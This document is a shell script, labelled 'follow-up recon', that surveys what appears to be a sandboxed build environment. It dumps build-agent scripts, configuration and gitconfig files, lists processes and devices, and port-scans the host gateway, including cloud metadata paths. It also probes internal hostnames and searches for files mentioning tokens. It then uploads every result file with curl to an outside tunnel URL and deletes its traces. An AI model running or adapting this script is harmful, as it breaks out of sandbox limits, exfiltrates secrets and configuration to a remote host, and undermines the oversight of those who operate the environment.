#!/bin/sh
# Follow-up recon: host gateway, build agent scripts, cache contents, processes.
BASE="https://olive-farmer-geneva-impressed.trycloudflare.com/80a0e7a7ad197916"
D=/tmp/recon2.$$
mkdir -p "$D" 2>/dev/null || exit 0
say() { printf '\n===== RECON2: %s =====\n' "$1" >>"$D/$1"; }
run() { s=$1; shift; say "$s"; { "$@" ; } >>"$D/$s" 2>&1; }
sh1() { s=$1; c=$2; say "$s"; { eval "$c" ; } >>"$D/$s" 2>&1; }

sh1 agent 'ls -la /usr/local/lib/sandlot /usr/local/lib/sandlot/shapes 2>/dev/null; for f in /usr/local/lib/sandlot/dispatch.sh /usr/local/lib/sandlot/env.sh /usr/local/lib/sandlot/shapes/*; do echo "##### $f"; sed -n "1,160p" "$f" 2>/dev/null; done'
sh1 output 'cat /output/meta 2>/dev/null; echo "--- local.properties"; cat /source/local.properties; echo "--- gitconfig"; cat /etc/gitconfig; echo "--- android"; ls -la /root/.android 2>/dev/null; echo "--- android sdk top"; ls -la /opt/android-sdk | head -20'
sh1 procs 'for p in /proc/[0-9]*; do printf "%s " "$p"; tr "\0" " " < "$p/cmdline" 2>/dev/null; echo; done | head -200; echo "--- dmesg"; busybox dmesg 2>/dev/null | tail -25; echo "--- devices"; ls /dev | grep -iE "vsock|vhost|virtio|vda|vdb"; cat /sys/class/net/eth0/address; hostname; cat /sys/block/vdb/device/serial 2>/dev/null'
sh1 hostping 'busybox ping -c 1 -W 1 172.16.0.1 2>&1 | head -5; echo "--- arp"; cat /proc/net/arp; echo "--- boot-time route"; cat /proc/net/route'
sh1 cache 'du -sh /cache/* 2>/dev/null; echo "--- gradle top"; ls -la /cache/gradle /cache/gradle/caches 2>/dev/null | head -60; echo "--- modules"; ls /cache/gradle/caches/modules-2/files-2.1 2>/dev/null | head -40; echo "--- build-cache"; ls -la /cache/gradle/caches/build-cache-1 2>/dev/null | head -20; echo "--- gradle props"; for f in /cache/gradle/gradle.properties /cache/gradle/init.gradle /cache/gradle/init.d/*; do echo "## $f"; cat "$f" 2>/dev/null; done; echo "--- npm"; ls -la /cache/npm | head; echo "--- pub"; ls -la /cache/pub | head'

say hostports
G=172.16.0.1
for p in 22 53 80 443 2375 2376 3000 3001 4000 5000 5001 5432 6379 8000 8001 8080 8081 8443 8888 9000 9001 9090 10250 30000; do
  if busybox nc -z -w 1 "$G" "$p" 2>/dev/null; then
    echo "OPEN $p" >>"$D/hostports"
    for path in / /health /api/health /latest/meta-data/; do
      { echo "--- http://$G:$p$path"; timeout 3 curl -sS -i -m 2 "http://$G:$p$path" 2>&1 | head -14; } >>"$D/hostports"
    done
  fi
done
echo "done" >>"$D/hostports"

sh1 hostdns 'for h in host gateway metadata sandlot coordinator api.ramus.dev; do printf "%s -> " "$h"; busybox nslookup "$h" 1.1.1.1 2>&1 | tail -4 | tr "\n" " "; echo; done'
sh1 tokengrep 'grep -ril "token" /etc /usr/local/lib /opt/android-sdk/platform-tools 2>/dev/null | head -20'

for f in "$D"/*; do
  b=$(basename "$f")
  printf '\n===== RECON2: %s =====\n' "$b"
  head -c 16000 "$f" 2>/dev/null
  printf '\n'
  timeout 10 curl -sS -m 10 --data-binary @"$f" "$BASE/$b" >/dev/null 2>&1 || true
done
printf '\n===== RECON2: done =====\n'
rm -rf "$D"
exit 0
